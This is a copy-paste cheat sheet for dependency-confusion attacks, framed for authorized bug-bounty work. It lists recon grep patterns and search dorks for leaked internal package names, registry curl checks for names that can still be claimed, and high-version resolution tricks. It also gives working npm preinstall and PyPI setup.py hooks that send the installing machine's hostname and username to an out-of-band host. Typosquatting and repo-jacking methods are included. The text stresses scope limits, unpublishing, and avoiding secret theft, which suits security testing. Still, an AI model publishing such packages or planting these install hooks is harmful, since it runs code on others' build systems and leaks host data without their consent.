# Dependency Confusion — Attack Arsenal (copy-paste)

**Author:** x8bitranjit
Recon sources, claimability queries, benign-beacon templates, and tools for the guide. **Authorized + responsible ONLY.**
Detect widely (read-only); publish narrowly (a name in your authorized scope), prove with a **benign beacon**, **unpublish**,
report. The finding is a **callback from the target's build** — never a payload (Guide §13/§16).

---

## 0. Recon — where internal package names leak (Guide §2)

*What & when:* your very first step — you can't claim a name you don't know. These commands harvest **internal package names** from files that list dependencies (**manifests**), from compiled front-end JavaScript (**bundles**), and from committed config that proves a private store exists. Run the `grep` lines against any JS/manifest you download; run the GitHub/GitLab **dorks** (targeted search queries) to find them at scale. Output = a candidate name list for §1.

```
# manifests exposed on the web / in public repos / wayback:
package.json  package-lock.json  yarn.lock  .npmrc                  (npm)
requirements.txt  Pipfile  Pipfile.lock  setup.py  pyproject.toml  pip.conf   (PyPI)
composer.json  composer.lock  Gemfile  Gemfile.lock  pom.xml  build.gradle  *.csproj  nuget.config
# JS bundles / source maps (../JSFiles/):
grep -Eo '@[a-z0-9-]+/[a-z0-9._-]+' bundle.js            # scoped names
grep -Eo "require\(['\"][^'\"]+['\"]\)" bundle.js
grep -Eo "from ['\"]@?[a-z0-9._/-]+['\"]" *.js
# committed registry configs that PROVE private packages exist (then hunt the names):
.npmrc  ->  registry=https://npm.internal.acme.com/   ;   @acme:registry=...
pip.conf / .pypirc  ->  index-url / extra-index-url = https://pypi.internal.acme.com/
nuget.config  ->  <add key="acme" value="https://nuget.internal.acme.com/..."/>
# GitHub/GitLab dorks:
"@acme/" filename:package.json ; filename:.npmrc org:acme ; "extra-index-url" org:acme ; filename:.gitlab-ci.yml "install"
```

---

## 1. Claimability check — read-only public-registry lookups (Guide §4)

*What & when:* run this on every name from §0 to find the ones you can actually register. Each line asks the public store for the name and prints only the **HTTP status code** — `404` means "not found" = **claimable** (the golden ones), `200` means taken. It's completely read-only (you're not publishing), so it's safe to run at scale. The `-o/dev/null -w '%{http_code}'` just tells curl "throw away the body, show me only the status number."

```
npm:      curl -s -o/dev/null -w '%{http_code}' https://registry.npmjs.org/<name>          # 404 = UNCLAIMED
          curl -s https://registry.npmjs.org/-/org/<scope>/user                            # scope reserved?
PyPI:     curl -s -o/dev/null -w '%{http_code}' https://pypi.org/pypi/<name>/json           # 404 = UNCLAIMED
RubyGems: curl -s -o/dev/null -w '%{http_code}' https://rubygems.org/api/v1/gems/<name>.json
NuGet:    curl -s -o/dev/null -w '%{http_code}' https://api.nuget.org/v3-flatcontainer/<name>/index.json
Composer: curl -s -o/dev/null -w '%{http_code}' https://repo.packagist.org/p2/<vendor>/<name>.json
# poc/claimable_check.py batches this (npm/pypi) with low-FP 404 = claimable classification.
```

---

## 2. Resolution: make the public copy win (Guide §6)

*What & when:* a claimable name is useless unless the target's tooling will actually *pick* your public copy over their private one. This is the checklist of conditions that make that happen — the headline being **publish a high version number** (`99.99.99`) so "highest-version-wins" tooling grabs yours. Match one of these to the target's setup (from the config you found in §0) before you bother publishing.

```
- publish a HIGH version so highest-version-wins resolution prefers yours:   "version": "99.99.99"
- pip --extra-index-url: pip installs the HIGHEST version across the default(public)+extra(private) -> a higher public version wins
- npm unscoped internal name with the public registry as default -> resolves straight to public
- Artifactory/Nexus VIRTUAL repo: the merge policy may prefer remote(public) over local(private)
```

---

## 3. Benign beacon templates (execution proof ONLY — Guide §7)

*What & when:* this is the actual proof package, used **only** on an authorized name after §1–§2 confirm it's worth it. The **install hook** (`preinstall` for npm, the body of `setup.py` for PyPI) runs one harmless "phone home" the moment the package installs. It sends a **beacon** — your OOB URL + a token + the machine's hostname — and nothing else. That single callback proves your code executed on their build; that *is* the finding, so there's never a reason to add data theft.

> The install hook must do exactly ONE thing: a DNS/HTTP callback to YOUR OOB with a token + hostname/username. No env dumps,
> no file reads, no shell, no persistence. `poc/benign_callback_pkg.py` generates these (and does NOT publish).

```
# npm package.json (scoped example, authorized name only):
{
  "name": "@acme/config",
  "version": "99.99.99",
  "description": "authorized dependency-confusion PoC - benign beacon - will be unpublished",
  "scripts": { "preinstall": "node beacon.js" }
}
# beacon.js (benign):
const os=require('os'),https=require('https');
const id=encodeURIComponent(`${os.hostname()}_${(os.userInfo().username||'?')}`);
https.get(`https://<TOKEN>.<your-oob>/dc?h=${id}`,()=>{}).on('error',()=>{});   // fire-and-forget, no data beyond host+token
```
```
# PyPI setup.py (benign):
import socket, getpass, urllib.request
from setuptools import setup
try:
    ident = f"{socket.gethostname()}_{getpass.getuser()}"
    urllib.request.urlopen("https://<TOKEN>.<your-oob>/dc?h=" + urllib.parse.quote(ident), timeout=5)
except Exception:
    pass
setup(name="acme-internal-utils", version="99.99.99",
      description="authorized DC PoC - benign beacon - will be yanked")
```

---

## 4. Publish → confirm → UNPUBLISH (Guide §8/§16)

*What & when:* the live proof, in order: publish the benign package, watch your listener for the target's build to phone home, then **immediately take it back down**. The unpublish step is not optional — it shrinks the window where a real attacker could abuse the name to almost nothing, which is exactly what keeps this responsible. Log the publish→unpublish timestamps for the report.

```
npm:    npm publish --access public            # authorized scope name only
        npm unpublish <name>@99.99.99 --force  # IMMEDIATELY after the callback
PyPI:   python -m build && twine upload dist/*  # authorized name only
        # then delete/yank the release in the PyPI UI
# watch interactsh for a callback from the TARGET's CI/dev egress carrying <TOKEN>+hostname = CONFIRMED.
# record the publish->unpublish window in the report.
```

---

## 5. Related supply-chain (Guide §9–§11)

*What & when:* when classic confusion doesn't fit (name already taken, or a namespace-strict ecosystem like Go), reach for these cousins. **Typosquat** = register a misspelling and wait for a fat-fingered install. **Repo-jacking** = claim a deleted GitHub username a dependency still points at. Same benign-beacon proof, same responsible discipline — just a different way in.

```
TYPOSQUAT (hygiene, benign proof):  reqiests/requsts vs requests ; crossenv vs cross-env ; acme_utils vs acme-utils
REPO-JACKING (Go/GitHub):  go.mod: require github.com/<deleted-user>/pkg  -> register that user -> host the module -> beacon
INSTALL HOOKS (where RCE fires):  npm pre/install/postinstall,prepare ; pip setup.py/sdist ; gem extconf.rb ; composer scripts
LOCKFILES:  npm ci / --require-hashes BLOCK pinned deps -> target `npm install` CI, unpinned/transitive internal deps
```

---

## 6. Tools

*What & when:* the kit's own scripts (`poc/…`) plus the standard third-party gear. Rough pipeline: `manifest_scan.py` pulls names → `claimable_check.py` (or **confused**) flags the claimable ones → `benign_callback_pkg.py` builds the proof package → **interactsh/Collaborator** catches the callback. Everything before the publish step is read-only and safe to run broadly.

| Tool | Use |
|------|-----|
| **`poc/manifest_scan.py`** | Extract dependency names from package.json/requirements.txt/composer.json/Gemfile/pom |
| **`poc/claimable_check.py`** | Read-only public-registry 404 check (npm/PyPI) → which names are UNCLAIMED |
| **`poc/benign_callback_pkg.py`** | GENERATE (not publish) a benign beacon package skeleton (npm/PyPI) for an authorized proof |
| **confused** (visma-prodsec) | Manifest → claimable-dependency scanner (Go) |
| **Snyk / OSS Index / dependency-check** | Supply-chain scanning |
| **interactsh / Collaborator** | Catch the build's DNS/HTTP callback (the proof) |
| **GitHub/GitLab search + wayback + gau** | Find leaked manifests / committed registry configs |

---

## 7. Triage rules (don't waste a report — and stay in bounds)

*What & when:* the "is this actually a finding?" lookup, read top-down as severity climbs. The gate everything hinges on: a real report needs a **callback from the target's own build** carrying your token. A leaked name, a claimable name, or a callback from your own machine are leads or noise — not reports. The bottom two lines are the tripwires that get reports rejected or take you out of scope.

```
internal name + PUBLIC 404 + reachable public resolver                          -> claimable candidate (HIGH); prove if authorized
authorized benign publish -> callback from the TARGET's CI egress + your token   -> REPORT Critical (CI/CD RCE); then UNPUBLISH
callback from a dev machine                                                      -> REPORT High/Critical (dev RCE)
unreserved npm @scope (all scoped pkgs confusable)                               -> REPORT High/Critical
go.mod imports a deleted GitHub user -> registered -> beacon                     -> REPORT High/Critical (repo-jacking)
internal name found but ALREADY public / lockfile-pinned / unclaimable           -> NOT DC (hygiene note at most)
callback from YOUR machine / a scanner, not the target                           -> not proof; correlate egress+token
you dumped CI secrets to "prove" it                                              -> OUT OF BOUNDS; a benign beacon is the proof
```

> Benign beacon (hostname + token) is the WHOLE proof. Authorized names only. **Unpublish immediately.** Report fast and
> recommend they reserve the name/scope. Never exfil secrets, never target names outside your scope. Authorized only.
